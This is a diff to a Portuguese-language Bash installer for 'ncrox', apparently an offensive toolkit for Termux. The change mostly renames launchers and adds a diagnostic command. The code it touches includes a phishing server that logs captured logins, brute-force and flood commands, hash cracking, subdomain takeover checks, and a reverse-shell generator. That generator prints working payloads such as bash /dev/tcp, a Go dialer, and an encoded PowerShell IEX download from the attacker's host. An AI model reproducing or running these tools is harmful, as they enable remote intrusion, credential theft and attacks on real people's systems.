-  [ -z "$dom" ] && { echo "uso: ncx-sub <dominio> [-w lista]"; return 1; }
-  _tag "ncx-sub :: $dom"
-  _sub_one(){ local ip; ip=$(getent hosts "$1.$2" 2>/dev/null | awk 'NR==1{print $1}'); \
+  [ -z "$dom" ] && { echo "uso: ncrox sub <dominio> [-w lista]"; return 1; }
+  _tag "sub :: $dom"
+  _sub_one(){ local ip; ip=$(_first_ip "$1.$2"); \
     [ -n "$ip" ] && printf '%s[+]%s %s.%s -> %s\n' "$G" "$R" "$1" "$2" "$ip"; }
   { if [ -n "$wl" ]; then f=$(_wl_path "$wl") && _wl_read "$f" || _def_sub; else
       if f=$(_wl_path dns5000); then _wl_read "$f"; else _def_sub; fi; fi; } | while read -r w; do
@@ -4263,13 +4346,13 @@ ncx_takeover(){
   local dom="" wl="" thr=20 n=0 w f fps
   while [ $# -gt 0 ]; do case "$1" in
     -w) wl="$2"; shift 2;; -t) thr="$2"; shift 2;;
-    -h|--help) echo "uso: ncx-takeover <dominio> [-w lista] [-t threads]"; return 0;;
+    -h|--help) echo "uso: ncrox takeover <dominio> [-w lista] [-t threads]"; return 0;;
     *) dom="$1"; shift;; esac; done
-  [ -z "$dom" ] && { echo "uso: ncx-takeover <dominio> [-w lista]"; return 1; }
-  _tag "ncx-takeover :: $dom"
+  [ -z "$dom" ] && { echo "uso: ncrox takeover <dominio> [-w lista]"; return 1; }
+  _tag "takeover :: $dom"
   _tk_one(){
     local sub="$1" dom="$2" fps="$3" fqdn="$sub.$dom" cn svc sig body
-    cn=$(dig +short CNAME "$fqdn" 2>/dev/null | head -1)
+    cn=$(_cname "$fqdn" | head -1)
     [ -z "$cn" ] && return 0
     while IFS='|' read -r svc sig; do
       case "$cn" in *"$svc"*)
@@ -4297,10 +4380,10 @@ ncx_crack(){
   local h="" wl="" rules="cdsl" thr=0 f
   while [ $# -gt 0 ]; do case "$1" in
     -w) wl="$2"; shift 2;; -r) rules="$2"; shift 2;; -t) thr="$2"; shift 2;;
-    -h|--help) echo "uso: ncx-crack <hash> [-w lista] [-r cdsl] [-t procs]"; return 0;;
+    -h|--help) echo "uso: ncrox crack <hash> [-w lista] [-r cdsl] [-t procs]"; return 0;;
     *) h="$1"; shift;; esac; done
-  [ -z "$h" ] && { echo "uso: ncx-crack <hash> [-w lista]"; return 1; }
-  _tag "ncx-crack :: ${h:0:24}…"
+  [ -z "$h" ] && { echo "uso: ncrox crack <hash> [-w lista]"; return 1; }
+  _tag "crack :: ${h:0:24}…"
   if [ -n "$wl" ]; then
     f=$(_wl_path "$wl") || { echo "lista não encontrada: $wl"; return 1; }
     _wl_read "$f" | python3 "$TOOLS/crack.py" "$h" -r "$rules" -t "$thr"
@@ -4314,13 +4397,13 @@ ncx_phish(){
   local port="" url="" title="Acesso restrito" dest="" tpl="" ip
   while [ $# -gt 0 ]; do case "$1" in
     -t) title="$2"; shift 2;; -d) dest="$2"; shift 2;; -r) tpl="$2"; shift 2;;
-    -h|--help) echo "uso: ncx-phish <porta> [url_alvo] [-t titulo] [-d destino] [-r template]"; return 0;;
+    -h|--help) echo "uso: ncrox phish <porta> [url_alvo] [-t titulo] [-d destino] [-r template]"; return 0;;
     *) if [ -z "$port" ]; then port="$1"; else url="$1"; fi; shift;; esac; done
-  [ -z "$port" ] && { echo "uso: ncx-phish <porta> [url_alvo]"; return 1; }
+  [ -z "$port" ] && { echo "uso: ncrox phish <porta> [url_alvo]"; return 1; }
   local dir="$HACK_DIR/phish"; mkdir -p "$dir"
   local page="$dir/page.html" log="$dir/capturas.log"
   : > "$page"
-  _tag "ncx-phish :: :$port${url:+ :: $url}"
+  _tag "phish :: :$port${url:+ :: $url}"
   if [ -n "$tpl" ] && [ -f "$tpl" ]; then
     cp "$tpl" "$page"; echo "  template: $tpl"
   elif [ -n "$url" ]; then
@@ -4336,19 +4419,12 @@ ncx_phish(){
   ip=$(_myip)
   echo "  login:  http://${ip:-SEU_IP}:$port"
   echo "  painel: http://${ip:-SEU_IP}:$port/_capturas"
-  echo "  log:    $log"
   [ -n "$dest" ] && echo "  redireciona: $dest"
   _hr
   PHISH_TITLE="$title" python3 "$TOOLS/phish.py" "$port" "$page" "$dest" "$log"
 }
 
 # ---------- reverse shell ----------
-_myip(){
-  local i
-  i=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
-  [ -z "$i" ] && i=$(ifconfig 2>/dev/null | grep -oE 'inet [0-9.]+' | awk '{print $2}' | grep -v '^127\.' | head -1)
-  printf '%s' "${i:-}"
-}
 _listen(){
   local port="$1" wrap=""
   command -v rlwrap >/dev/null 2>&1 && wrap="rlwrap -cAr "
@@ -4358,7 +4434,7 @@ _listen(){
   elif command -v nc >/dev/null 2>&1; then exec ${wrap}nc -l -p "$port"
   else echo "pkg install netcat-openbsd"; fi
 }
-ncx_listen(){ [ -z "${1:-}" ] && { echo "uso: ncx-listen <porta>"; return 1; }; _listen "$1"; }
+ncx_listen(){ [ -z "${1:-}" ] && { echo "uso: ncrox listen <porta>"; return 1; }; _listen "$1"; }
 _p(){
   local n="$1" pl="$2"
   [ -n "$ONLY" ] && [ "$ONLY" != "$n" ] && return 0
@@ -4373,16 +4449,16 @@ ncx_rev(){
   while [ $# -gt 0 ]; do case "$1" in
     -t) ONLY="$2"; shift 2;; -a) ONLY=""; shift;; -u) URLENC=1; shift;;
     -b) B64=1; shift;; -i) det=1; shift;; -l) LISTEN=1; shift;;
-    -h|--help) echo "uso: ncx-rev <lhost|-> <lport> [-t tipo] [-u] [-b] [-i] [-l]"; \
+    -h|--help) echo "uso: ncrox rev <lhost|-> <lport> [-t tipo] [-u] [-b] [-i] [-l]"; \
       echo "tipos: bash sh bash196 nc nc-mkfifo ncat socat python3 python2 perl php ruby node awk telnet xterm lua java powershell powershell-b64 golang"; return 0;;
     *) if [ -z "$lhost" ]; then lhost="$1"; else lport="$1"; fi; shift;; esac; done
-  [ -z "$lport" ] && { echo "uso: ncx-rev <lhost|-> <lport> [-t tipo]"; return 1; }
+  [ -z "$lport" ] && { echo "uso: ncrox rev <lhost|-> <lport> [-t tipo]"; return 1; }
   case "$lport" in ''|*[!0-9]*) echo "porta inválida"; return 1;; esac
   if [ "$lport" -lt 1 ] || [ "$lport" -gt 65535 ]; then echo "porta fora de 1-65535"; return 1; fi
   [ "$lhost" = "-" ] && det=1
   [ "$det" = 1 ] && lhost=$(_myip)
   [ -z "$lhost" ] && { echo "informe o IP"; return 1; }
-  _tag "ncx-rev :: $lhost:$lport"
+  _tag "rev :: $lhost:$lport"
   _p bash "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
   _p sh "sh -i >& /dev/tcp/$lhost/$lport 0>&1"
   _p bash196 "0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
@@ -4405,13 +4481,13 @@ ncx_rev(){
   _p powershell-b64 "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $(printf "IEX (New-Object Net.WebClient).DownloadString('http://%s/rev.ps1')" "$lhost" | iconv -t UTF-16LE | base64 -w0)"
   _p golang "echo 'package main;import(\"os\";\"net\");func main(){c,_:=net.Dial(\"tcp\",\"$lhost:$lport\");go func(){b:=make([]byte,1024);for{n,_:=c.Read(b);os.Stdout.Write(b[:n])}}();b:=make([]byte,1024);for{n,_:=os.Stdin.Read(b);c.Write(b[:n])}}' > /tmp/r.go && go run /tmp/r.go"
   [ "$EMIT" = 0 ] && { printf '%s[!]%s tipo desconhecido: %s\n' "$RD" "$R" "$ONLY"; return 1; }
-  printf '%slistener:%s ncx-listen %s%s\n' "$D" "$R" "$lport" "$R"
+  printf '%slistener:%s ncrox listen %s%s\n' "$D" "$R" "$lport" "$R"
   if [ "$LISTEN" = 1 ]; then _hr; _listen "$lport"; fi
 }
 
 # ---------- utilitários ----------
-ncx_hash(){ [ -f "${1:-}" ] && sha256sum "$1" || echo "uso: hash <arquivo>"; }
-ncx_base64(){ case "${1:-}" in enc) printf '%s' "${2:-}" | base64 -w0; echo;; dec) printf '%s' "${2:-}" | base64 -d; echo;; *) echo "uso: base64 enc|dec <texto>";; esac; }
+ncx_hash(){ [ -f "${1:-}" ] && sha256sum "$1" || echo "uso: ncrox hash <arquivo>"; }
+ncx_base64(){ case "${1:-}" in enc) printf '%s' "${2:-}" | base64 -w0; echo;; dec) printf '%s' "${2:-}" | base64 -d; echo;; *) echo "uso: ncrox base64 enc|dec <texto>";; esac; }
 ncx_urlinfo(){ [ -z "${1:-}" ] && return 1; python3 -c "import sys,urllib.parse as u;p=u.urlparse(sys.argv[1]);[print(f'{k:8}: {v}') for k,v in [('esquema',p.scheme),('host',p.netloc),('caminho',p.path),('query',p.query)]]" "$1" 2>/dev/null; }
 ncx_jsoncheck(){ python3 -c "import json,sys;json.load(open(sys.argv[1],encoding='utf-8'));print('JSON válido')" "${1:-}" 2>/dev/null || echo "JSON inválido"; }
 ncx_comparar(){ sha256sum "${1:-}" "${2:-}" 2>/dev/null | awk '{print $1}' | uniq -c | awk '{print ($1==2)?"iguais":"diferentes"}'; }
@@ -4447,15 +4523,14 @@ ncx_dispatch(){
   local c="${1:-help}"; shift 2>/dev/null
   case "$c" in
     help|ajuda) ncx_help;;
+    doctor) ncx_doctor;;
     vigia) ncx_vigia "$@";; oraculo) ncx_oraculo "$@";; bastiao) ncx_bastiao "$@";; selo) ncx_selo "$@";;
     search) ncx_search "$@";; web) ncx_web "$@";; dns) ncx_dns "$@";; whois) ncx_whois "$@";;
     net|ip) ncx_net "$@";; github) ncx_github "$@";; ondeuto) ncx_ondeuto "$@";;
     hack|nhack) ncx_nhack "$@";; htx) ncx_htx "$@";; reap) ncx_reap "$@";; oz) ncx_oz "$@";;
-    port|ncx-port) ncx_port "$@";; dir|ncx-dir) ncx_dir "$@";;
-    brute|ncx-brute) ncx_brute "$@";; flood|ncx-flood) ncx_flood "$@";; sub|ncx-sub) ncx_sub "$@";;
-    takeover|ncx-takeover) ncx_takeover "$@";; crack|ncx-crack) ncx_crack "$@";; phish|ncx-phish) ncx_phish "$@";;
-    rev|ncx-rev) ncx_rev "$@";; listen|ncx-listen) ncx_listen "$@";;
-    wl|wordlists|ncx-wordlists) ncx_wordlists "$@";;
+    port) ncx_port "$@";; dir) ncx_dir "$@";; brute) ncx_brute "$@";; flood) ncx_flood "$@";;
+    sub) ncx_sub "$@";; takeover) ncx_takeover "$@";; crack) ncx_crack "$@";; phish) ncx_phish "$@";;
+    rev) ncx_rev "$@";; listen) ncx_listen "$@";; wl|wordlists) ncx_wordlists "$@";;
     hash) ncx_hash "$@";; base64) ncx_base64 "$@";; urlinfo) ncx_urlinfo "$@";; jsoncheck) ncx_jsoncheck "$@";;
     comparar) ncx_comparar "$@";; fileinfo) ncx_fileinfo "$@";; uuid) ncx_uuid;; netcheck) ncx_netcheck "$@";;
     sysinfo) ncx_sysinfo;; disk) ncx_disk "$@";; which) ncx_which "$@";; where) ncx_where "$@";;
@@ -4475,6 +4550,8 @@ LIBEOF
 # ==========================================================================
 #  launchers
 # ==========================================================================
+CMDS="vigia oraculo bastiao selo search web dns whois net github ondeuto port dir brute flood sub takeover crack phish htx reap oz rev listen wordlists hash base64 urlinfo jsoncheck comparar fileinfo uuid netcheck sysinfo disk which where findtext rede tree readmd device battery storage screen uptime locale timezone volume ringer say open pack docs applist tasklist settings doctor"
+
 write_bins() {
   mkdir -p "$BIN"
   cat > "$BIN/ncrox" <<'EOF'
@@ -4485,10 +4562,10 @@ case "${1:-}" in
   ""|-i|--interactive)
     ncx_banner
     if [ -f "$NCROX_HOME/src/satanachia.py" ] && command -v python3 >/dev/null 2>&1; then
-      printf '%smodo nativo. "exit" encerra.%s\n\n' "$D" "$R"
+      printf '%smodo nativo ncrox. "exit" encerra.%s\n\n' "$D" "$R"
       cd "$NCROX_HOME/src" && exec python3 satanachia.py
     else
-      printf '%smodo réplica%s\n\n' "$D" "$R"; ncx_help
+      printf '%smodo réplica. ncrox help para comandos.%s\n\n' "$D" "$R"
     fi ;;
   for)
     shift; case "${1:-hack}" in hack) shift;; esac
@@ -4522,21 +4599,22 @@ rm -f "$PREFIX/bin/ncrox" "$PREFIX/bin/ncrox-update" "$PREFIX/bin/ncrox-restore"
 termux-reload-settings 2>/dev/null
 echo "removido do shell. ~/.ncrox preservado"
 EOF
-  local t
-  for t in port dir brute flood sub rev listen wordlists takeover crack phish htx reap oz; do
-    cat > "$BIN/ncx-$t" <<EOF
-#!/usr/bin/env bash
-source "\$HOME/.ncrox/lib/ncrox_lib.sh"
-ncx_$t "\$@"
-EOF
-  done
   cat > "$BIN/nhack" <<'EOF'
 #!/usr/bin/env bash
 source "$HOME/.ncrox/lib/ncrox_lib.sh"
 ncx_nhack "$@"
 EOF
-  chmod +x "$BIN"/ncrox "$BIN"/ncrox-update "$BIN"/ncrox-restore "$BIN"/ncx-* "$BIN"/nhack
-  printf '%s[+]%s launchers em %s\n' "$G" "$R" "$BIN"
+  local t
+  for t in $CMDS; do
+    cat > "$BIN/ncx-$t" <<EOF
+#!/usr/bin/env bash
+source "\$HOME/.ncrox/lib/ncrox_lib.sh"
+ncx_$t "\$@"
+EOF
+    chmod +x "$BIN/ncx-$t"
+  done
+  chmod +x "$BIN/ncrox" "$BIN/ncrox-update" "$BIN/ncrox-restore" "$BIN/nhack"
+  printf '%s[+]%s %s launchers em %s\n' "$G" "$R" "$(printf '%s\n' $CMDS | wc -l)" "$BIN"
 }
 
 # ==========================================================================
@@ -4560,14 +4638,15 @@ write_motd() {
   [ -f "$PREFIX/etc/motd" ] && cp "$PREFIX/etc/motd" "$BK/motd"
   {
     printf '\n%s%s%s\n' "$O" "$ART" "$R"
-    printf '%s   s a t a n a c h i a  ·  n c r o x  ·  t e r m u x%s\n' "$B" "$R"
-    printf '%s   ──────────────────────────────────────────────%s\n' "$D" "$R"
-    printf '%s   %s@%s  ·  %s%s\n' "$D" "$(whoami)" "$(uname -n)" "$(date '+%d/%m %H:%M')" "$R"
-    printf '%s   ncrox help          comandos%s\n' "$D" "$R"
+    printf '%s   ncrox :: termux edition%s\n' "$B" "$R"
+    printf '%s   ----------------------------------------------%s\n' "$D" "$R"
+    printf '%s   %s@%s · %s%s\n' "$D" "$(whoami)" "$(uname -n)" "$(date '+%d/%m %H:%M')" "$R"
+    printf '%s   ncrox help          comandos (ncrox <cmd> ou ncx-<cmd>)%s\n' "$D" "$R"
+    printf '%s   ncrox doctor        diagnóstico%s\n' "$D" "$R"
     printf '%s   ncrox for hack      arsenal nhack%s\n' "$D" "$R"
-    printf '%s   ncx-port · ncx-dir · ncx-brute · ncx-flood%s\n' "$D" "$R"
-    printf '%s   ncx-htx · ncx-reap · ncx-oz%s\n' "$D" "$R"
-    printf '%s   ──────────────────────────────────────────────%s\n\n' "$D" "$R"
+    printf '%s   port · dir · brute · flood · rev · phish%s\n' "$D" "$R"
+    printf '%s   htx · reap · oz%s\n' "$D" "$R"
+    printf '%s   ----------------------------------------------%s\n\n' "$D" "$R"
   } > "$PREFIX/etc/motd"
   printf '%s[+]%s tela de entrada reescrita\n' "$G" "$R"
 }
@@ -4614,7 +4693,7 @@ write_keys() {
 install() {
   need_termux
   banner
-  mkdir -p "$NCROX_HOME" "$BK" "$TOOLS" "$RBIN" "$TMPD" "$HACK_DIR"
+  mkdir -p "$NCROX_HOME" "$BK" "$TOOLS" "$RBIN" "$TMPD" "$HACK_DIR" "$NCROX_HOME/wordlists"
   deps
   fetch_ncrox
   write_hacktools
@@ -4627,10 +4706,11 @@ install() {
   printf '\n%s[*]%s wordlists base...\n' "$B" "$R"
   source "$LIB"; ncx_wordlists auto
   termux-reload-settings 2>/dev/null || true
-  printf '\n%s[+] concluído%s\n' "$G" "$R"
-  printf '%s    exec bash -l%s\n\n' "$D" "$R"
-  printf '%s    ncrox help | ncx-htx -h | ncx-reap -l | ncx-oz --help%s\n\n' "$D" "$R"
-  printf '%s    reaper compila no primeiro uso (pkg install golang)%s\n\n' "$D" "$R"
+  printf '\n%s[+] instalação concluída%s\n' "$G" "$R"
+  printf '%s    exec bash -l%s\n' "$D" "$R"
+  printf '%s    ncrox doctor%s\n' "$D" "$R"
+  printf '%s    ncrox help%s\n\n' "$D" "$R"
+  source "$LIB"; ncx_doctor
 }
 
 case "${1:-install}" in
@@ -4638,5 +4718,7 @@ case "${1:-install}" in
   update) exec "$BIN/ncrox-update" ;;
   restore) exec "$BIN/ncrox-restore" ;;
   banner) banner ;;
-  *) echo "uso: bash ncrox.sh [install|update|restore|banner]" ;;
+  *)
+    if [ -f "$LIB" ]; then source "$LIB"; ncx_dispatch "$@"
+    else echo "uso: bash ncrox.sh [install|update|restore|banner|comando]" ; fi ;;
 esac
